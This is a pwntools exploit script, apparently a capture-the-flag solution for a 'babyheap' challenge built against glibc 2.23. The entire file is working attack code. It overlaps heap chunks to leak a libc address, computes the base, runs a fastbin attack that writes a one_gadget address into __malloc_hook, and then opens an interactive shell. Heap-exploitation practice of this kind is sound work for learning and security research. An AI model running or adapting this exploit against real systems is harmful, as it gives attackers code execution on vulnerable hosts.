import pwn
from pwn import *

context.binary = "babyheap_patched"
context.log_level = 'DEBUG'

p = process("./babyheap_patched")
libc = ELF("./libc-2.23.so")

def allocate(size):
 p.recvuntil(b": ")
 p.sendline(b"1")
 p.recvuntil(b"Size: ")
 p.sendline(size)

def fill(index,size,content):
 p.recvuntil(b": ")
 p.sendline(b"2")
 p.recvuntil(b"Index: ")
 p.sendline(index)
 p.recvuntil(b"Size: ")
 p.sendline(size)
 p.recvuntil(b"Content: ")
 p.sendline(content)

def free(index):
 p.recvuntil(b": ")
 p.sendline(b"3")
 p.recvuntil(b"Index: ")
 p.sendline(index)

def dump(index):
 p.recvuntil(b": ")
 p.sendline(b"4")
 p.recvuntil(b"Index: ")
 p.sendline(index)
 p.recvuntil(b"Content: \n")
 content = p.recvline()
 return content

allocate(b"240")
allocate(b"112")
allocate(b"240")
allocate(b"48")



fill(b"0",b"240",b"A"*240)
fill(b"1",b"112",b"B"*112)
fill(b"2",b"240",b"C"*240)
fill(b"3",b"48",b"D"*48)


free(b"0")
free(b"1")

allocate(b"120")
fill(b"0",b"128",b"4"*112 + p64(0x180) + p64(0x100))

#pwn.gdb.attach(p,'''
#brva *D48
#''')


free(b"2")

allocate(b"240")
fill(b"1",b"240",b"A"*240)

#pwn.gdb.attach(p,'''
#brva *D48
#''')

leak = u64(dump(b"0")[:8])
libc_base = leak - libc.sym['__malloc_hook'] - 0x68
one = libc_base + 0x4526a
mallochook = libc_base + libc.sym['__malloc_hook']
fakechunk = mallochook - 0x23
log.info("Leak: " + hex(leak))
log.info("System: " + hex(one))
log.info("mallochook: " + hex(mallochook))
log.info("fakechunk: " + hex(fakechunk))
log.info("libc base is: " + hex(libc_base))

free(b"1")

allocate(b"16")
allocate(b"96")
allocate(b"96")
allocate(b"96")

free(b"5")
free(b"4")
free(b"0")

allocate(b"96")
allocate(b"96")
fill(b"0",b"96",p64(fakechunk) + p64(0) + b"a"*80)
allocate(b"96")



allocate(b"96")
fill(b"6",b"27", b"b"*19 + p64(one))
p.sendline(b"1")
p.recvuntil(b"Size: ")
p.sendline(b"10")
p.interactive()
